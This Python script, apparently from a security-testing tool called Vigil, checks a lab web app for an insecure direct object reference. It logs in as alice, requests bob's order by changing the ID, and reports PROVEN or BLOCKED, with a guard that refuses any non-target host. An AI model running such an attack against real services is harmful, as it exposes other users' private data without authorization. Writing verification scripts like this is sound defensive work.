"""Vigil proof-of-attack client: IDOR on GET /api/orders/[id].

Logs in as alice, then requests BOB's order (ord_b1) by changing the ID.
Prints PROVEN (with the full request/response evidence) or BLOCKED.
The verdict is decided by code (HTTP status + response body), never by a model.

SECURITY RULE: this client may ONLY call the URL in VIGIL_TARGET_URL.
Every request goes through _request(), which hard-fails unless the
scheme/host/port of the URL exactly match the configured target.

Usage:
    VIGIL_TARGET_URL=http://localhost:3001 uv run proof/attack.py

Env:
    VIGIL_TARGET_URL   required. Base URL of the target app, e.g. http://localhost:3001
    VIGIL_ATTACKER     default "alice"   (login that performs the attack)
    VIGIL_ATTACKER_PASS default "alice123"
    VIGIL_VICTIM_ORDER  default "ord_b1" (the order id we try to read)

Exit code: 0 = PROVEN (vulnerability reproduced), 1 = BLOCKED, 2 = setup error.
"""
from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

# ---------------------------------------------------------------- target guard

_target = os.environ.get("VIGIL_TARGET_URL", "").strip().rstrip("/")
if not _target:
    print("SETUP ERROR: VIGIL_TARGET_URL is not set. "
          "Example: VIGIL_TARGET_URL=http://localhost:3001", file=sys.stderr)
    sys.exit(2)

_TARGET_PARTS = urllib.parse.urlsplit(_target)
if _TARGET_PARTS.scheme not in ("http", "https") or not _TARGET_PARTS.netloc:
    print(f"SETUP ERROR: VIGIL_TARGET_URL must be an http(s) URL, got {_target!r}", file=sys.stderr)
    sys.exit(2)


def _guard(url: str) -> str:
    """Allow only URLs that share the exact scheme://host:port of VIGIL_TARGET_URL."""
    p = urllib.parse.urlsplit(url)
    if (p.scheme, p.hostname, p.port) != (
        _TARGET_PARTS.scheme,
        _TARGET_PARTS.hostname,
        _TARGET_PARTS.port,
    ):
        raise RuntimeError(f"REFUSED: {url!r} is outside VIGIL_TARGET_URL={_target!r}")
    return url


def _request(method: str, path: str, body: dict | None = None,
             cookie: str | None = None) -> tuple[int, dict, str]:
    """One guarded HTTP call. Returns (status, headers, raw_body)."""
    url = _guard(urllib.parse.urljoin(_target + "/", path.lstrip("/")))
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read().decode("utf-8", "replace")


# ---------------------------------------------------------------- the attack

def main() -> int:
    attacker = os.environ.get("VIGIL_ATTACKER", "alice")
    attacker_pass = os.environ.get("VIGIL_ATTACKER_PASS", "alice123")
    victim_order = os.environ.get("VIGIL_VICTIM_ORDER", "ord_b1")

    print(f"target          : {_target}")
    print(f"attack          : login as {attacker!r}, then GET /api/orders/{victim_order} (bob's order)")

    # 1) login as the attacker
    status, headers, raw = _request(
        "POST", "/api/login", {"username": attacker, "password": attacker_pass})
    print(f"\n--> POST /api/login  body={json.dumps({'username': attacker, 'password': '***'})}")
    print(f"<-- {status}  {raw[:300]}")
    if status != 200:
        print("\nBLOCKED: could not log in as the attacker (setup problem, not a proof).")
        return 1
    cookie = None
    for k, v in headers.items():
        if k.lower() == "set-cookie" and v.startswith("vigil_session="):
            cookie = v.split(";", 1)[0]
    if not cookie:
        print("\nBLOCKED: login succeeded but no vigil_session cookie was set.")
        return 1

    # 2) the attack: read the victim's order by changing the ID
    path = f"/api/orders/{urllib.parse.quote(victim_order)}"
    status, _headers, raw = _request("GET", path, cookie=cookie)
    print(f"\n--> GET {path}  Cookie: {cookie.split('=')[0]}=<alice's session>")
    print(f"<-- {status}  {raw[:500]}")

    # 3) verdict — decided by code only
    leaked = False
    try:
        payload = json.loads(raw)
        leaked = isinstance(payload, dict) and payload.get("id") == victim_order
    except ValueError:
        leaked = False

    print("\n" + "=" * 60)
    if status == 200 and leaked:
        print(f"PROVEN: {attacker} read order {victim_order} belonging to another user.")
        print(f"  request : GET {path} (authenticated as {attacker})")
        print(f"  response: {status} {raw[:500]}")
        print("=" * 60)
        return 0
    print(f"BLOCKED: server returned {status}; order {victim_order} was not disclosed to {attacker}.")
    print(f"  request : GET {path} (authenticated as {attacker})")
    print(f"  response: {status} {raw[:500]}")
    print("=" * 60)
    return 1


if __name__ == "__main__":
    sys.exit(main())
